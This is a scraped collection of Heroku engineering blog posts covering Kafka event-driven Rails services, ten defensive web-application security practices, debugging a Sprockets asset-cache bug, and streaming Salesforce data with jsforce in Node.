you create these schemas. So if you're curious to learn more about Avro, the Salsify engineering blog here has a really great write-up on Avro and Avro::Builder. So that is it for my talk today. I have a couple more slides though, so don't start leaving. I always feel really weird when people are like, and thank you, and then they have a couple more slides. But, so if you're curious to learn more actually about Heroku and how we run our hosted Kafka products or how we use it internally, we do have two talks that my co-workers, Jeff and Pavel, have given that you can watch. And if you're interested in Postgres, related to Kafka, but different, my co-worker Gabe is giving a talk literally in the next talk spot in room 306 about Postgres 10, performance, and you. And then finally, I will be at the Heroku booth today after this and during lunch if you want to come by and say hi. You can ask me questions, you can get swag. We've got T-shirts and socks. And we also have some jobs, the usual. So yeah, thank you so much. In recent years, designing software as a collection of services, rather than a single, monolithic codebase, has become a popular way to build applications. In this post, we'll learn the basics of Kafka and how its event-driven process can be used to power your Rails services. We’ll also talk about practical considerations and operational challenges that your event-driven Rails services might face around monitoring and scaling. What is Kafka? Suppose you want to know more information about how your users are engaged on your platform: the pages they visit, the buttons they click, and so on. A sufficiently popular app could produce billions of events, and sending such a high volume of data to an analytics service could be challenging, to say the least. Enter Kafka , an integral piece for web applications that require real-time data flow. Kafka provides fault-tolerant communication between producers , which generate events, and consumers , which read those events. There can be multiple producers and consumers in any single app. In Kafka, every event is persisted for a configured length of time, so multiple consumers can read the same event over and over. A Kafka cluster is comprised of several brokers , which is just a fancy name for any instance running Kafka. One of the key performance characteristics of Kafka is that it can process an extremely high throughput of events. Traditional enterprise queuing systems, like AMQP, have the event infrastructure itself keep track of the events that each consumer has processed. As your number of consumers scales up, that infrastructure will suffer under a greater load, as it needs to keep track of more and more states. And even establishing an agreement with a consumer is not trivial. Should a broker mark a message as \"done\" once it's sent over the network? What happens if a consumer goes down and needs a broker to re-send an event? Kafka brokers, on the other hand, do not track any of its consumers. The consumer service itself is in charge of telling Kafka where it is in the event processing stream, and what it wants from Kafka. A consumer can start in the middle, having provided Kafka an offset of a specific event to read, or it can start at the very beginning or even very end. A consumer's ability to read event data is constant time of O(1); as more events arrive, the amount of time to look up information from the stream doesn't change. Kafka also has a scalable and fault-tolerant profile. It runs as a cluster on one or more servers that can be scaled out horizontally by adding more machines. The data itself is written to disk and then replicated across multiple brokers. For a concrete number around what scalable looks like, companies such as Netflix, LinkedIn, and Microsoft all send over a trillion messages per day through their Kafka clusters! Setting Kafka up in Rails Heroku provides a Kafka cluster add-on that can be used in any environment. For Ruby apps, we recommend using the ruby-kafka gem for real-world use cases. A bare minimum implementation only requires you to provide hostnames for your brokers: # config/initializers/kafka_producer.rb\nrequire \"kafka\"\n\n# Configure the Kafka client with the broker hosts and the Rails\n# logger.\n$kafka = Kafka.new([\"kafka1:9092\", \"kafka2:9092\"], logger: Rails.logger)\n\n# Set up an asynchronous producer that delivers its buffered messages\n# every ten seconds:\n$kafka_producer = $kafka.async_producer(\n  delivery_interval: 10,\n)\n\n# Make sure to shut down the producer when exiting.\nat_exit { $kafka_producer.shutdown } After setting up the Rails initializer, you can start using the gem to send event payloads. Because of the asynchronous behavior of sending events, we can write an event outside the thread of our web execution, like this: class OrdersController < ApplicationController\n  def create\n    @comment = Order.create!(params)\n\n    $kafka_producer.produce(order.to_json, topic: \"user_event\", partition_key: user.id)\n  end\nend We'll talk more about Kafka's serialization formats below, but in this scenario, we're using good old JSON. The topic keyword argument refers to the log where Kafka is going to write the event. Topics themselves are divided into partitions , which allow you to \"split\" the data in a particular topic across multiple brokers for scalability and reliability. It's a good idea to have two or more partitions per topic so if one partition fails, your events can still be written and consumed. Kafka guarantees that events are delivered in order inside a partition, but not inside a whole topic. If the order of the events is important, passing in a partition_key will ensure that all events of a specific type go to the same partition. Kafka for your services Some of the properties that make Kafka valuable for event pipeline systems also make it a pretty interesting fault tolerant replacement for RPC between services. Let's use an example of an e-commerce application to illustrate what this means in practice: def create_order\n  create_order_record\n  charge_credit_card # call to Payments Service\n  send_confirmation_email # call to Email Service\nend Let's assume that when a user places an order, this create_order method is going to be executed. It'll create an order record, charge the user's credit card, and send out a confirmation email. Those last two steps have been extracted out into services. One challenge with this setup is that the upstream service is responsible for monitoring the downstream availability. If the email system is having a really bad day, the upstream service is responsible for knowing whether that email service is available. And if it isn't available, it also needs to be in charge of retrying any failing requests. How might Kafka's event stream help in this situation? Let's take a look: In this event-oriented world, the upstream service can write an event to Kafka indicating that an order was created. Because Kafka has an \"at least once\" guarantee, the event is going to be written to Kafka at least once, and will be available for a downstream consumer to read. If the email service is down, the event is still persisted for it to consume. When the downstream email service comes back online, it can continue to process the events it missed in sequence. Another challenge with an RPC-oriented architecture is that, in increasingly complex systems, integrating a new downstream service means also changing an upstream service. Suppose you'd like to integrate a new service that kicks off a fulfillment process when an order is created. In an RPC world, the upstream service would need to add a new API call out to your new fulfillment service. But in an event-oriented world, you would add a new consumer inside the fulfillment service that consumes the order once the event is created inside of Kafka. Incorporating events in a service-oriented architecture In a blog post titled \" What do you mean by “Event-Driven” ,\" Martin Fowler discusses the confusion surrounding \"event-driven applications.\" When developers discuss these systems, they can actually be talking about incredibly different kinds of applications. In an effort to bring a shared understanding to what an event-driven system is , he's started defining a few architectural patterns. Let's take a quick look at what these patterns are! If you'd like to learn more about them, check out his keynote at GOTO Chicago 2017 that covers these in-depth. Event Notification The first pattern Fowler talks about is called Event Notification . In this scenario, one service simply notifies the downstream services that an event happened with the bare minimum of information: {\n  \"event\": \"order_created\",\n  \"published_at\": \"2016-03-15T16:35:04Z\"\n} If a downstream service needs more information about what happened, it will need to make a network call back upstream to retrieve it. Event-Carried State Transfer The second pattern is called Event-Carried State Transfer . In this design, the upstream service augments the event with additional information, so that a downstream consumer can keep a local copy of that data and not have to make a network call to retrieve it from the upstream service: {\n  \"event\": \"order_created\",\n  \"order\": {\n    \"order_id\": 98765,\n    \"size\": \"medium\",\n    \"color\": \"blue\"\n  },\n  \"published_at\": \"2016-03-15T16:35:04Z\"\n} Event-Sourced A third designation from Fowler is an Event-Sourced architecture. This implementation suggests that not only is each piece of communication between your services kicked off by an event, but that by storing a representation of an event, you could drop all your databases and still completely rebuild the state of your application by replaying that event stream. In other words, each payload encapsulates the exact state of your system at any moment. An enormous challenge to this approach is that, over time, code changes. A future API call to a downstream service might return a different set of data that previously available, which makes it difficult to recalculate the state at that moment. Command Query Responsibility Segregation The final pattern mentioned is Command Query Responsibility Segregation , or CQRS. The idea here is that actions you might need to perform on a record--creating, reading, updating--are split out into separate domains. That means that one service is responsible for writing and another is responsible for reading. In event-oriented architectures, you'll often see event systems nestled in the diagrams at the place where commands are actually written. The writer service is going to read off of the event stream, process commands, and store them to a write database. Any queries happen on a read-only database. Separating out read and write logic into two different services adds an increase in complexity, but it does allow you to optimize performance separately for those systems. Practical considerations Let's talk about a few practical considerations that you might run into while integrating Kafka into your service-oriented application. The first thing to consider are slow consumers. In an event-driven system, your services need to be able to process events as quickly as the upstream service produces them. Otherwise, they will slowly drift behind, without any indication that there's a problem, because there won't be any timeouts or call failures. One place where you can identify timeouts will be on the socket connection with the Kafka brokers. If a service is not processing events fast enough, that connection can timeout, and reestablishing it has an additional time cost since it's expensive to create those sockets. If a consumer is slow, how do you speed it up? For Kafka, you can increase the number of consumers in your consumer group so that you can process more events in parallel. You'll want at least two consumer processes running per service, so that if one goes down, any other failed partitions can be reassigned. Essentially, you can parallelize work across as many consumers as you have topic partitions. (As with any scaling issue, you can't just add consumers forever; eventually you're going to hit scaling limits on shared resources, like databases.) It's also extremely valuable to have metrics and alerts around how far behind you are from when an event was added to the queue. ruby-kafka is instrumented with ActiveSupport notifications, but it also has StatsD and Datadog reporters that are automatically included. You can use these to report on whether you're lagging behind when the events are added. The ruby-kafka gem even provides a list of recommended metrics to monitor ! Another aspect to building systems with Kafka is to design your consumers for failure. Kafka is guaranteed to send an event at least once; there's never a chance that messages will not be sent at all. But you need to design consumers to expect duplicated events. One way to do that is to always rely on UPSERT to add new records to your database. If a record already exists with the same attributes, the call will essentially be a no-op. Alternatively, you can include a unique identifier to each event, and just skip operating on events that have already been seen before. Payload formats One surprising aspect to Kafka is its very permissive attitude towards data. You can send it anything in bytes and it will simply send that back out to consumers without any verification. This feature makes its usage extremely flexible because you don't need to adopt a specific format. But what happens when an upstream service decides to change an event that it produces? If you just change that event payload, there's a really good chance that one of your downstream consumers will break. Before you begin adopting an event-driven architecture, choose a data format and evaluate how it can help you register schemas and evolve them over time. It's much easier to think about validation and evolution of schemas before you actually implement them. One format to use is, of course, JSON, the format of the web. It's human readable and supported in basically every programming language. But there are a few downsides. For one, the actual size of JSON payloads can be really large. The payloads require you to send key-value pairs, which are flexible, but are also often duplicated across every event. There's no built-in documentation inside a payload, such that, given a value, you might not know what it means. Schema evolution is also a challenge, since there's no built-in support for aliasing one key to another if you need to rename a field. Confluent, the team that built Apache Kafka, recommends using Avro as a data serialization system. The data is sent over in binary, so it's not human-readable. But the upside is that there is a more robust schema support. A full Avro object includes its schema and its data. Avro comes with support for simple types, like integers, and complex ones, like dates. It also embeds documentation into the schema, which allows you to comprehend what a field does in your system. It provides built-in tools that help you evolve your schemas in backwards-compatible ways over time. avro-builder is a gem created by Salsify that offers a very Ruby-ish DSL to help you create your schemas. If you're curious to learn more about Avro, the Salsify engineering blog has a really great writeup on avro and avro-builder! More information If you're curious to learn more about how we run our hosted Kafka products, or how we use Kafka internally at Heroku, we do have two talks other Heroku engineers have given that you can watch! Jeff Chao's talk at DataEngConf SF '17 was titled \" Beyond 50,000 Partitions: How Heroku Operates and Pushes the Limits of Kafka at Scale ,\" while Pavel Pravosud spoke at Dreamforce '16 about \" Dogfooding Kafka: How We Built Heroku's Real-Time Platform Event Stream .\" Enjoy! architecture kafka rails", "date": "2019-01-14,"},
{"website": "Heroku", "title": "Ten Ways to Secure your Applications", "author": ["Joe Kutner"], "link": "https://blog.heroku.com/ten-ways-to-secure-your-apps", "abstract": "Ten Ways to Secure your Applications Posted by Joe Kutner February 21, 2019 Listen to this article This blog post is adapted from a talk given by Joe Kutner at Devoxx 2018 titled \" 10 Mistakes Hackers Want You to Make .\" Building self-defending applications and services is no longer aspirational--it’s required. Applying security patches, handling passwords correctly, sanitizing inputs, and properly encoding output is now table stakes. Our attackers keep getting better, and so must we. In this blog post, we'll take a look at several commonly overlooked ways to secure your web apps. Many of the examples provided will be specific to Java , but any modern programming language will have equivalent tactics. 1. Ensure dependencies are up-to-date Every year, OWASP , a group of security experts and researchers, publishes a list of the common application security risks to watch out for. One of the more common issues they've found is the use of  dependencies with known vulnerabilities . Once a known CVE is published, many open source maintainers and contributors make a concentrated effort to released patched updates to popular frameworks and libraries. But one report found that more than 70% of exploited applications are due to outdated dependencies . To ensure that your projects are relying on the latest and greatest packages, and automating your dependency management is recommended. With Maven , you can use the Maven Versions Plugin , which automatically updates your pom.xml to use the newest packages. In Ruby , the bundle update command does something similar. You could incorporate these tools into your CI/CD process, and have a test outright fail if a dependency is outdated, thus forcing you to upgrade a package before your app can be deployed. A more proactive approach might be to incorporate a tool that automatically monitors your dependencies for you, such as Snyk . Rather than running a check when code is modified (which could expose your app to a vulnerability for weeks or months, if it's infrequently updated), Snyk monitors your dependencies and compares them with a known list of vulnerabilities mapped to dependencies . If a problem is identified, they'll alert you with a report identifying which dependencies are outdated and which version contains a patched fix. Snyk is also free to try on Heroku. 2. Explicitly declare acceptable user payloads All too often, web applications will accept nearly anything a user submits through a form or an API. For example, a user may attempt to create an account with a password containing over a thousand characters. When numerous requests like this are sent, it is possible the server will crash under the intense computation necessary to encrypt them. One way to mitigate attacks like this is by implementing database-level constraints. Columns should have a maximum size defined, or your data model should refuse to accept NULL values. While placing these restrictions on the database is always a good idea, it can be considered too \"low level,\" as certain attacks can be exploited fair earlier in the request cycle. If your application is exposed to the Internet, every vulnerability is just one curl call away. In one example with the Jackson data-binding library , a simple JSON payload was able to execute arbitrary code, once the request was received by the server. By providing an explicit list of expected inputs , you can ensure that your application is only operating on data that it knows will be coming, and ignoring (or politely erroring) on everything else.  If your application accepts JSON, perhaps as part of an API, implementing JSON schemas are an excellent way to model acceptable requests. For example, if an endpoint takes two string fields named firstName and lastName , and one integer named age , a JSON schema to validate user-provided requests might look like this: {\n  \"title\": \"Person\",\n  \"type\": \"object\",\n  \"properties\": {\n    \"firstName\": {\n      \"type\": \"string\",\n      \"description\": \"The person's first name.\"\n    },\n    \"lastName\": {\n      \"type\": \"string\",\n      \"description\": \"The person's last name.\"\n    },\n    \"age\": {\n      \"description\": \"Age in years which must be equal to or greater than zero.\",\n      \"type\": \"integer\",\n      \"minimum\": 1\n    }\n  }\n} By stating the valid types, you can prevent unexpected issues from occurring if a user decides to send integers for firstName or negative numbers for age . In addition to the request body, you should also check request headers and query parameters, which can be similarly exploitable. 3. Assert safe regular expressions Regular expressions are both a boon and curse for every developer. They can make pattern matching on strings an easy task, but a poorly crafted regular expression can also bring an application down. Consider a simple pattern like this one: (a|aa)+ . While it looks innocuous, the | (\"or\") combined with the + operator can take a catastrophically long time to match against a string such as \"aaaaaaaaaaaaaaaaaaaaaaaa!\" . Malicious users could cause a denial-of-service attack on your system by submitting a particularly complicated (yet still technically \"valid\") text. ( A similar issue affected the Node.js community several years ago.) Validating your regular expressions will ensure that they are not susceptible to this type of ReDoS attack . One tool you can use is saferegex , a command-line Java utility that will report on the likelihood of a regular expressions causing a problem: $ java -jar target/saferegex.jar \"(a|aa)+\"\n\nTesting: (a|aa)+\nMore than 10000 samples found.\n***\nThis expression is vulnerable.\nSample input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab 4. Prevent abusive requests Building a popular application involves more than just adding desired features. Your site will also need to handle the amount of traffic it receives as it grows. Even if every part of your application is secure, bad actors who repeatedly hammer your servers could succeed in bringing them down. To ensure uptime for your users, you should throttle aggressive clients . This can be done in a few different ways, like limiting requests by IP address or user agent. A better implementation would be to use a library that takes advantage of a token-bucket algorithm . Bucket4j is one such library. Incoming requests are grouped by a variety of properties into individual \"buckets,\" and those buckets can in turn be throttled or blacklisted entirely. By classifying which requests are acceptable and which aren't, you'll be able to better handle sudden bursts of traffic. 5. Align your code to be secure-first Often, in the midst of a particularly frustrating bug, we may in our haste implement a solution pilfered from some corner of the Internet. While finally solving a problem may come as a much-needed relief, it's always worth triple-checking that you haven't inadvertently introduced a security issue. A few years ago, researchers found that a majority of acceptable answers on StackOverflow contained insecure flaws . Code that works does not mean that code is secure. Even if a snippet works in the short-term, it's important to be absolutely certain that it is safe to use. 6. Store credentials outside your codebase We all know (hopefully!) that divulging your personal password can be a catastrophic mistake. In any sufficiently complicated application, there can be a dozen different tokens and passwords to manage: your database username and password, tokens to authenticate to New Relic, or DataDog, or Redis... Keep your application's configuration separate from your code. Even if your repository is private, embedding plaintext credentials is never a good idea. A disgruntled employee who shouldn't have access could steal the token to impersonate users. To ensure that your project is safe, you should be confident that, if the code became open source at any moment, none of your credentials would be compromised. Store your secrets in environment variables. A library like dotenv can seamlessly load and make use of these variables, provided they're accessible in a secure location. Another option is to use a product like Hashicorp Vault , which allows your application to manage secrets through a configurable CLI. 7. Deny HTTP requests Unless you have a very specific use case, you should disable HTTP connections to your server . An HTTPS connection ensures that data between the client and the server is encrypted, thus prohibiting person-in-the-middle snooping attacks. Most major browsers default to HTTPS connections by default, and services such as Let's Encrypt make it easier than ever to obtain an SSL certificate for your application. If you need to support HTTP locally or between a proxy and your web server, you can configure your server to only accepts clients whose X-Forwarded-Proto request header is set to https . Depending on your setup, this may also be configurable outside of your code via an NGINX or Apache configuration. 8. Enable certificate checking Sometimes, your application might need to make a call to an external provider. Similar to the suggestion above, you should enable certificate checking for outgoing connections . This ensures that communication to third-party APIs or services are also secured via HTTPS. Note that if a third-party website has a misconfigured certificate, it can cause errors when your application tries to connect. You might be tempted to just disable certificate checking to ensure that the application \"just works,\" but this is a very insecure move that puts your users' data at risk. You can use a library like EnvKeyStore to facilitate the storage of keys and certificates. Similar to dotenv, EnvKeyStore asks that you keep set a certificate PEM be to an environment variable. You can then use this PEM as the default checker for any outgoing client requests. For example: KeyStore ts = EnvKeyStore.createWithRandomPassword(\"TRUSTED_CERT\").keyStore();\n\nString tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();\nTrustManagerFactory tmf = TrustManagerFactory.getInstance(tmfAlgorithm);\ntmf.init(ts);\n\nSSLContext sc = SSLContext.getInstance(\"TLS\");\nsc.init(null, tmf.getTrustManagers(), new SecureRandom());\nHttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n\nString urlStr = \"https://ssl.selfsignedwebsite.xyz\";\nURL url = new URL(urlStr);\nHttpsURLConnection con = (HttpsURLConnection)url.openConnection();\ncon.setDoInput(true);\ncon.setRequestMethod(\"GET\");\ncon.getInputStream().close(); 9. Log and monitor suspicious behavior Many applications only log critical failures, like unexpected server errors. But even behavior we have accounted for can be used as an attack vector. In those cases, it's imperative to log any sensitive action . An example of some behavior to log includes: Successful and unsuccessful logins Password resets Changes to access levels Authorization failures In many of these cases, a user who is repeatedly generating an error may be a sign of a malicious attacker attempting to take over an account. In order to separate these events from other errors, we recommend prefixing your log statements with phrases such as SECURITY_SUCCESS , SECURITY_FAILURE , and SECURITY_AUDIT . This way, you can easily filter on specific categories of authorization failures, should the need arise.  Keep in mind that sensitive information, such as session IDs or passwords, should not be logged, as they will be stored in plaintext. Another tactic to employ is to add an intrusion detection system . OWASP has a project called AppSensor , which provides a framework to detect and respond to potential attacks in an automated way. This works by adding an agent to your web application which sends events to your external AppSensor service. AppSensor will analyze those events, and, if it determines malicious behavior, AppSensor will respond back to the web app with a payload of information identifying what is going on. The application can then determine which action to take. Take a look at the list of AppSensor detection points to potentially identify where your application needs improved intrusion detection. 10. Limit your own access We all make mistakes. Although we ask users of our applications to behave with security in mind, we also need to practice good security hygiene . Some common sense actions that everyone should take include: Using two-factor authentication wherever possible Locking your computer screen any time you're not at your workstation Implementing unique passwords across accounts and services, and using a password manager Final thoughts Security is hard, not because it's difficult to implement, but because it's difficult to identify how to be secure. When writing code it's far easier to achieve the intended functionality but much harder to conceive the unintended functionality, which is where your security issues will arise. In addition, there are many different kinds of security that comprise a healthy security posture: network security, platform security, physical security, and so on. The ten ways you just learned to protect yourself are good starting points to ensure that your application security is top-notch. If you want to continue learning about web application security, you can check out the OWASP Getting Started guide for more information. Stay safe! java security", "date": "2019-02-21,"},
{"website": "Heroku", "title": "Debugging in Ruby—Busting a Year-old Bug in Sprockets", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/debugging-year-old-sprockets-bug", "abstract": "Debugging in Ruby—Busting a Year-old Bug in Sprockets Posted by Richard Schneeman February 26, 2019 Listen to this article Debugging is an important skill to develop as you work your way up to more complex projects. Seasoned engineers have a sixth sense for squashing bugs and have built up an impressive collection of tools that help them diagnose and fix bugs. I'm a member of Heroku’s Ruby team and creator of CodeTriage and today we’ll look at the tools that I used on a journey to fix a gnarly bug in Sprockets . Sprockets is an asset packaging system written in Ruby that lies at the heart of  Rails’ asset processing pipeline. At the end of the post, you will know how Sprockets works and how to debug in Ruby. Unexpected Behavior in Sprockets Sprockets gives developers a convenient way to compile, minify, and serve JavaScript and CSS files. Its extensible preprocessor pipeline has support for languages like CoffeeScript, SaaS, and SCSS. It is included in Rails via the sprockets-rails gem but can also be used in a standalone fashion, for example, to package Sinatra assets . Earlier this month, we recorded a live-debugging session where we experienced particularly curious issue in Sprockets. We noticed that the bug broke the critical asset precompilation rake task, but only if the name of the project folder was changed between successive task executions. While project folder renames might seem relatively uncommon, they happen frequently on Heroku because each build happens in a unique directory name. While this bug itself is interesting, what’s even more interesting is learning from our debugging process. You can learn about the tools and steps we use to narrow down the root cause, and ultimately fix the bug. If you’d like to watch the full debugging session, check out the video or just follow along by reading the text below. We’ll walk through a debug workflow and find the root cause of this bug. A Guide to Debugging in Ruby Head-scratching, non-obvious bugs are worth investigating because they may lead to other unnoticed or unreported bugs. Thankfully, Ruby comes with some powerful debugging tools that are easy to use for beginners. For a nice overview, check out this Ruby debugging guide that covers basics like the difference between p and puts and also discusses a few of the interactive debuggers that are available in the Ruby ecosystem. For the rest of this post, however, you won’t need to know anything more advanced than puts . Reproducing the Bug The best way to learn debugging is just to dive in and try it. Let’s set up Sprockets in a local environment. Clone CodeTriage We need a Rails app to reproduce this bug so we’ll use an open source example. I am the creator of CodeTriage so it’s natural to use that application to demonstrate the problem, although you can reproduce it with any Rails app that uses Sprockets. CodeTriage has helped developers triage issues for thousands of open-source projects . First, clone the CodeTriage repository, install dependencies, then switch to a branch that contains the code we need to reproduce the bug. A working Ruby environment is assumed. $ git clone git@github.com:codetriage/codetriage\n$ cd codetriage\n\n$ gem install bundler\n$ bundle install\n\n$ cp config/database.example.yml config/database.yml\n$ git checkout 52d57d13 Compile the Assets with Rake Next, execute the following steps to make the bug show up in our local environment. $ rm -rf tmp/cache\n$ rm -rf public/assets Next, run the rake task for precompiling assets, which should succeed: $ RAILS_ENV=production RAILS_SERVE_STATIC_FILES=1 RAILS_LOG_TO_STDOUT=1 bin/rake assets:precompile Rename the Project Folder Now, change the name of the project directory by copying its files into a new directory called codetriage-after and deleting the old codetriage directory. $ cd ..\n$ cp -r codetriage codetriage-after\n$ rm -rf codetriage\n$ cd codetriage-after One more time, run the assets:precompile rake task: $ RAILS_ENV=production RAILS_SERVE_STATIC_FILES=1 RAILS_LOG_TO_STDOUT=1 bin/rake assets:precompile The task should fail this time and produce the following error message: Sprockets is complaining that it can’t find the file /private/tmp/repro/codetriage/app/assets/javascripts/application.js.erb . This actually makes sense because in the last step we changed codetriage to codetriage-after as our project folder name, yet it is looking in codetriage . (Note that the /private/tmp/repro part of the path may be different for you based on where you cloned the codetriage repository.) Finding the Root Cause of the Bug Now that we have reproduced the bug in the video, the next step is to jump into the code of the Sprockets dependency at one of the lines in the stack trace in a method called fetch_asset_from_dependency_cache . Your application depends on reading code in the libraries, which is required when debugging, especially once you have ruled out any issues with the code you’ve written. Read gem code with bundle open Ruby’s de-facto gem manager Bundler contains a helpful command called bundle open that opens the source code of a gem in your favorite editor. Run it like this: $ bundle open sprockets As long as you have a $EDITOR or $BUNDLER_EDITOR environment variable set, your preferred code editor will open to the project directory of the specified gem. Now you can browse the gem source code and even modify it, adding print statements to see the value of variables or trying out various fixes to see if they work. How Sprockets Caches Files The error message above implied that the wrong value is being stored in the Sprockets cache, so the next step is to look at the cache to confirm. The cache is stored on disk across many files, so first we need to find the specific file that contains the record we want to inspect. The key to that record is a digest of the Sprockets cache ID. That’s the value we’ll try to find in the files. Once you have the Sprockets code open, navigate to lib/sprockets/loader.rb , where you’ll find the method fetch_asset_from_dependency_cache toward the end. The documentation for this method provides insight into how Sprockets uses the idea of pipelines, histories, and dependencies to aid in caching. To get more of the backstory, I recommend watching the video starting from about the six-minute mark. We examined the on-disk contents of the Sprockets cache, looking for the ID cache key of a specific object in the Sprockets cache. $ grep -R 5d0abb0a8654a1f03d6b27 tmp/cache This is a helpful debugging command to file away for later. grep -R searches through the tmp/cache directory looking for any files that contain the string “5d0abb0a8654a1f03d6b27”, which is a Sprockets cache key. The -R flag is what makes it traverse directories recursively. In our case, the grep command does produce a cache file and we can use cat to view the contents. Inside of that cache file, we find something unexpected: an absolute path to an asset. Sprockets should only cache relative paths, not absolute paths. Since we changed the absolute path to our project directory to create this bug, it’s quite likely that this is the culprit. Loading Up IRB To investigate further and confirm this suspicion, we fire up IRB, the interactive Ruby debugger. If you’re new to Ruby or the IRB, we recommend How To Use IRB to Explore Ruby as a good way to see how to use it. It’s simple but powerful and is a must-have in your Ruby debugging toolkit. We then use IRB to inspect the file cache from Sprockets point of view. $ irb\nreirb(main):001:0> require ‘sprockets’\nreirb(main):001:0> Sprockets::Environment.new.cache\nreirb(main):001:0> Sprockets::Environment.new.cache.get(“5d0abb0a8654a1f03d6b27”) Unfortunately, this does not work because the cache key is not the same as the cache ID. So, we move on to confirming this hypothesis in another way. We still include this example here to let you know that IRB is something you can use for any Ruby code and specifically with the handy Environment class in Sprockets. Fixing to_load and to_link To fix the bug, let’s modify the to_load and to_link methods in loader.rb to force relative paths for objects going into the cache and coming out, using the compress_from_root and expand_from_root utility methods from Sprockets base.rb . This ensures that absolute paths won’t make their way into the cache again, and consequently, that renaming the project directory won’t cause any issues in subsequent asset compilations. if cached_asset[:metadata][:to_load] && !cached_asset[:metadata][:to_load].empty?\n  cached_asset[:metadata][:to_load] = cached_asset[:metadata][:to_load].dup\n  cached_asset[:metadata][:to_load].map! { |uri| compress_from_root(uri) }\nend\n\n if cached_asset[:metadata][:to_link] && !cached_asset[:metadata][:to_link].empty?\n  cached_asset[:metadata][:to_link] = cached_asset[:metadata][:to_link].dup\n  cached_asset[:metadata][:to_link].map! { |uri| compress_from_root(uri) }\nend Our pull request to fix the bug contains a test to prove that the fix works. Writing tests for your bug fixes is a best practice that you should always strive to follow. It’s the best way to prevent old bugs from crawling back into your codebase. Wrap-up Inevitably, your code will do something that couldn’t possibly happen. That’s when you need to get out your debugging tools. We hope that you have picked up a few new ones from this post. Your code will do something that couldn’t possibly happen in production. If your app runs on Heroku, make sure to familiarize yourself with the variety of logging solutions available as add-ons. These add-ons will make running and debugging problems on Heroku easier and they only take seconds to set up. debugging sprockets rails ruby", "date": "2019-02-26,"},
{"website": "Heroku", "title": "Reactive Programming with Salesforce Data", "author": ["Mars Hall"], "link": "https://blog.heroku.com/reactive-programming-salesforce-data", "abstract": "Reactive Programming with Salesforce Data Posted by Mars Hall February 28, 2019 Listen to this article The recent introduction of Platform Events and Change Data Capture (CDC) in Salesforce has launched us into a new age of integration capabilities. Today, it's possible to develop custom apps that respond to activity in Salesforce. Whether you're creating a memorable customer interaction or implementing an internal workflow for employees, consider an event-sourced design to improve responsiveness and durability of the app. In this article, we'll look at an event-sourced app architecture that consumes the Salesforce Streaming API using the elegant jsforce JavaScript library in a Node app on Heroku . Streaming with jsforce In summer 2018, the open-source jsforce library implemented a new version of its streaming module, making it a first-class consumer of the Salesforce Streaming API. This new streaming functionality is available in jsforce version 1.9.0 and later. jsforce's stream subscriptions are based on the Faye pub/sub JavaScript module. The Faye client simplifies using Salesforce streams by handling authentication, maintaining network connectivity, and providing an extensible messaging interface. To consume a Salesforce stream, we construct a Faye streaming client from a jsforce connection, and then subscribe a callback function to receive messages from the desired topic. Let's see this in action. Basic Example After running npm install jsforce@^1.9.1 and configuring Salesforce authentication for the jsforce Connection, a Node app can consume data streams from Salesforce with just a few lines of JavaScript code: const jsforce = require('jsforce');\n\n// Establish an authenticated Salesforce connection. (Details elided)\nconst conn = new jsforce.Connection({ … });\n\n// The Salesforce streaming topic and position to start from.\nconst channel = \"/data/ChangeEvents\";\nconst replayId = -1; // receive only new messages without replay\n\n// Construct a streaming client.\nconst fayeClient = conn.streaming.createClient([\n  new jsforce.StreamingExtension.Replay(channel, replayId),\n  new jsforce.StreamingExtension.AuthFailure(() => process.exit(1))\n]);\n\n// Subscribe to the channel with a function to receive each message.\nconst subscription = fayeClient.subscribe(channel, data => {\n  console.log('topic received data', JSON.stringify(data));\n});\n\n// Eventually, close the connection.\nsubscription.cancel(); Using this basic example in the real-world will result in a fragile app. It will loose track of its place in the stream on every server restart. It cannot scale-up for parallel processing, because there's no coordination between each Faye client subscription to the Salesforce data stream. So, let's take a look at how we meet these challenges with a more complete example. Real-World Example A Node.js + jsforce Heroku app that displays a feed of Salesforce Account changes using CDC (change-data capture), an easy-to-demo use-case: https://github.com/heroku-examples/salesforce-streams-nodejs In order to make our stream consumer durable , the app must keep track of the last message it consumed, the “Replay ID”, and restart from that position. To make our stream consumer scalable , the app must be able to distribute messages to many parallel processes. The app uses a Redis datastore to solve these two problems. With Redis, the Replay ID for each topic can be tracked and messages distributed to many clients through pub/sub or reliable queues. Design Considerations As you design your app to integrate with Salesforce Streaming API, keep the following in mind. Singleton Consumer The Salesforce Streaming API has no provision for distributing delivery across multiple consumers (e.g. consumer groups in Kafka). So, stick to a single stream consumer process . To support scaling-up work on the incoming messages, the singleton consumer should send messages into a pub/sub channel or a reliable queue for distribution to parallel, web or worker processes . In the example Heroku app diagrammed above, we put this architecture to work. The Procfile declares these two process types. Redis is used to coordinate these two processes. The stream_consumer process is singleton, run in a single process only, that pushes each message into Redis. The web process can scale-up to multiple clients/processes/dynos in order to handle the messages from Redis. Authenticated User When developing an app with Salesforce data, it's super easy to use the default Salesforce Admin user account to do everything, including API integrations. Beyond developer experimentation, always create a separate Salesforce user for API integration . That user should be easy to distinguish by name (e.g. “Follow-up Bot” or “BizOps Warehouse”) and must be given permission to the event objects utilized by the reactive app. The specific permissions required may be setup according to the documentation for Change Data Capture and Platform Events . In the example Heroku app, the .env file contains local configuration values which might be okay as an Admin user. When you set the deployment config vars on Heroku, always use a separate, non-admin user. Note that other members/collaborators on a Heroku app can see the values of the deployment's config vars. Don't accidentally disclose Admin access to a production Salesforce org. Flow Monitoring Anytime external integrations are introduced into an app, consider how to detect and alert on failures. With streaming systems, a fault condition might be represented by simply nothing happening! Instrument your app to provide direct insight into streams' health, like: Salesforce Connection status, active clients, last seen message time, and message processing duration. Stream On! While the concept of event-sourcing is old, the implementation of this architecture is still new to many of us. As we transform more and more business workflows into IT, these kinds of lightweight, reactive apps can drive amazing experiences. Using Node.js with jsforce on Heroku we can quickly implement Salesforce-reactive apps in perhaps the most accessible, popular programming language on the planet. Of course this architecture can be built in other languages too; Java with CometD client is featured in the Salesforce Developer docs. Let us know what you think in the example app's GitHub issues . node salesforce jsforce event sourcing", "date": "2019-02-28,"},
